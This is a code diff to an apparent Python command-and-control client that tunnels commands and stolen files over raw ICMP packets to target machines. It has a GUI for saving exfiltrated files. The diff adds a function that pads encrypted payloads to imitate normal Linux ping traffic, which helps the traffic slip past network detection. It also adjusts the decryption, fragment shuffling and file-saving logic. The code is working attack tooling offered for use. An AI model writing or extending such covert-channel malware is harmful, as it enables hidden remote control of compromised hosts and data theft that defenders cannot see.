@@ -22,7 +22,7 @@ is_echo = False
 ICMP_ID = 0x1111       
 DEFAULT_SHIFT_VALUE = 1
 DEFAULT_RAILFENCE_RAILS = 4
-DEFAULT_BIT_RAILFENCE_RAILS = 7
+DEFAULT_BIT_RAILFENCE_RAILS = 7		# Set at >=2 
 HANDSHAKE_PREFIX = b"SYNC:"
 ACK_PREFIX = b"ACK:"
 PROBE_COMMAND = b"probe"  
@@ -190,6 +190,32 @@ def substitution_decrypt(data, table):
 def reverse_data(data):
     return data[::-1]
 
+def generate_linux_mimic_padding(length, seed):
+    random.seed(seed)
+    padding = bytearray()
+    while len(padding) < length:
+        r = random.random()
+        if r < 0.45:
+            run_len = random.randint(6, 24)
+            padding.extend(b'\x00' * run_len)
+        elif r < 0.70:
+            start = random.randint(0x08, 0x50)
+            run_len = random.randint(8, 32)
+            padding.extend(bytes(range(start, start + run_len)))
+        elif r < 0.85:
+            patterns = [
+                b'0123456789' * 6,
+                b'abcdefghijklmnopqrstuvwabcdefghi' * 2,
+                struct.pack('!I', random.randint(0, 0xffffffff)) * random.randint(3, 6),
+            ]
+            pat = random.choice(patterns)
+            padding.extend(pat[:random.randint(12, 36)])
+        else:
+            chunk = random.randbytes(random.randint(4, 12))
+            chunk = bytes(b & 0x7F if random.random() < 0.8 else b for b in chunk)
+            padding.extend(chunk)
+    return bytes(padding[:length])
+
 def layered_encrypt(data, padding_seed=None, sub_table=None, shift=DEFAULT_SHIFT_VALUE, railfence_rails=DEFAULT_RAILFENCE_RAILS, bit_rails=DEFAULT_BIT_RAILFENCE_RAILS, layers=None, selected_ops=None):
     pre_redun_len = len(data)
     redundancy_len = int(pre_redun_len * REDUNDANCY_FACTOR)
@@ -221,25 +247,11 @@ def layered_encrypt(data, padding_seed=None, sub_table=None, shift=DEFAULT_SHIFT
         random.seed(padding_seed if padding_seed is not None else 0 + sum(map(ord, op)))
         if random.random() < 0.5:
             data = minor_funcs[op](data)
-    ent = calculate_entropy(data)
-    extra_pad_len = 0
-    chunk_size = 8
-    low_block = bytes(0x08 + i for i in range(chunk_size))
-    max_extra = len(data) // 2
-    extra_pad = b''
-    while (ent > 6 or ent < 4) and extra_pad_len < max_extra:
-        extra_pad_len += chunk_size
-        if ent > 6:
-            temp_pad = low_block * (extra_pad_len // chunk_size) + low_block[:extra_pad_len % chunk_size]
-        else:
-            random.seed(padding_seed if padding_seed is not None else 0)
-            temp_pad = bytes(random.randint(0, 255) for _ in range(extra_pad_len))
-        tentative = data + temp_pad
-        ent = calculate_entropy(tentative)
-        extra_pad = temp_pad
-    if ent > 6 or ent < 4:
-        pass
-    data = struct.pack('!H', len(data)) + data + extra_pad
+    data = struct.pack('!H', len(data)) + data
+    mimic_seed = padding_seed ^ len(data) if padding_seed is not None else 0
+    pad_len = random.randint(16, 48) if len(data) > 100 else random.randint(8, 24)
+    mimic = generate_linux_mimic_padding(pad_len, mimic_seed)
+    data += mimic
     return data
 
 def layered_decrypt(data, sub_table=None, shift=DEFAULT_SHIFT_VALUE, railfence_rails=DEFAULT_RAILFENCE_RAILS, bit_rails=DEFAULT_BIT_RAILFENCE_RAILS, layers=None, selected_ops=None, padding_seed=None):
@@ -276,7 +288,6 @@ def layered_decrypt(data, sub_table=None, shift=DEFAULT_SHIFT_VALUE, railfence_r
     return data
 
 def light_encrypt(data, padding_seed=None, sub_table=None, shift=DEFAULT_SHIFT_VALUE, railfence_rails=DEFAULT_RAILFENCE_RAILS, bit_rails=DEFAULT_BIT_RAILFENCE_RAILS, layers=None, selected_ops=None):
-    
     layer_funcs = {
         'reverse': reverse_data,
         'railfence': lambda d: railfence_encrypt(d, railfence_rails),
@@ -296,10 +307,20 @@ def light_encrypt(data, padding_seed=None, sub_table=None, shift=DEFAULT_SHIFT_V
         random.seed(padding_seed if padding_seed is not None else 0 + sum(map(ord, op)))
         if random.random() < 0.5:
             data = minor_funcs[op](data)
+    data = struct.pack('!H', len(data)) + data
+    mimic_seed = padding_seed ^ len(data) if padding_seed is not None else 0
+    pad_len = random.randint(16, 48) if len(data) > 100 else random.randint(8, 24)
+    mimic = generate_linux_mimic_padding(pad_len, mimic_seed)
+    data += mimic
     return data
 
 def light_decrypt(data, sub_table=None, shift=DEFAULT_SHIFT_VALUE, railfence_rails=DEFAULT_RAILFENCE_RAILS, bit_rails=DEFAULT_BIT_RAILFENCE_RAILS, layers=None, selected_ops=None, padding_seed=None):
-    
+    if len(data) < 2:
+        return b''
+    original_len = struct.unpack('!H', data[:2])[0]
+    if len(data) < 2 + original_len:
+        return b''
+    data = data[2:2 + original_len]
     selected = [op for op in selected_ops or [] if op != 'noise']
     minor_inverse_funcs = {
         'flip': lambda d: bytes(b ^ (random.randint(0, 1) if random.random() < 0.1 else 0) for b in d),
@@ -541,7 +562,6 @@ def send_command(target_ip, command, req_type, icmp_id, seq_queue, cmd_prefix, p
         total_packets = 1 + total_frags
         sent = 0
 
-        
         init_payload = cmd_prefix + FRAG_START + struct.pack('!4sI32s', frag_id, total_frags, overall_hash)
         encrypted_init = light_encrypt(init_payload, padding_seed, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops)
         with seq_lock:
@@ -555,12 +575,10 @@ def send_command(target_ip, command, req_type, icmp_id, seq_queue, cmd_prefix, p
         if cancel_event and cancel_event.is_set():
             return "Command canceled"
 
-        
         frags_with_num = list(enumerate(frags))
         random.seed(padding_seed + len(data))
         random.shuffle(frags_with_num)
 
-        
         for num, frag_data in frags_with_num:
             if cancel_event and cancel_event.is_set():
                 return "Command canceled"
@@ -593,7 +611,7 @@ def send_probe(target_ip, req_type, icmp_id, icmp_sequence, cmd_prefix, padding_
 def check_probe_response(target_ip, rep_type, icmp_id, probe_seq, out_prefix, sub_table, shift, railfence_rails, bit_rails, family, local_ip, proto, poly_seed=None, mutation_count=3, layers=None, selected_ops=None, padding_seed=None):
     start_time = time.time()
     with socket.socket(family, socket.SOCK_RAW, proto) as sock:
-        while time.time() - start_time < 10:
+        while time.time() - start_time < 11:
             ready = select.select([sock], [], [], 1)
             if ready[0]:
                 data, addr = sock.recvfrom(2048)
@@ -696,7 +714,6 @@ def receive_output(target_ip, rep_type, icmp_id, output_text, root, out_prefix, 
                                     perc = (received / total) * 100 if total > 0 else 0
                                     root.after(0, lambda: exfil_status_label.config(text="{:.1f}% ({}/{}) packets".format(perc, received, total)))
                                 if received < total:
-                                    
                                     send_dummy(target_ip, req_type, icmp_id, seq_queue, family, proto, poly_seed, mutation_count)
                                 if received == total:
                                     assembled_encrypted = b''.join(buf['frags'].get(i, b'') for i in range(total))
@@ -715,11 +732,13 @@ def receive_output(target_ip, rep_type, icmp_id, output_text, root, out_prefix, 
                                                 file_data = lzma.decompress(compressed_data)
                                             except lzma.LZMAError:
                                                 file_data = compressed_data
-                                            save_path = filedialog.asksaveasfilename(defaultextension=".bin", initialfile=filename)
-                                            if save_path:
-                                                with open(save_path, 'wb') as f:
-                                                    f.write(file_data)
-                                                root.after(0, lambda: output_text.insert(tk.END, f"Exfiled file saved to {save_path}\n\n"))
+                                            def do_save():
+                                                save_path = filedialog.asksaveasfilename(defaultextension=".bin", initialfile=filename)
+                                                if save_path:
+                                                    with open(save_path, 'wb') as f:
+                                                        f.write(file_data)
+                                                    output_text.insert(tk.END, f"Exfiled file saved to {save_path}\n\n")
+                                            root.after(0, do_save)
                                         elif output.startswith("UPLOAD_SUCCESS:"):
                                             root.after(0, lambda: output_text.insert(tk.END, f"Upload success: {output[len('UPLOAD_SUCCESS:'):]}\n\n"))
                                         elif output.startswith("UPLOAD_ERROR:"):
@@ -1124,3 +1143,4 @@ if __name__ == "__main__":
             sys.exit(1)
 
     main(args.target_ips, req_type, rep_type, args.id, family, proto)
+
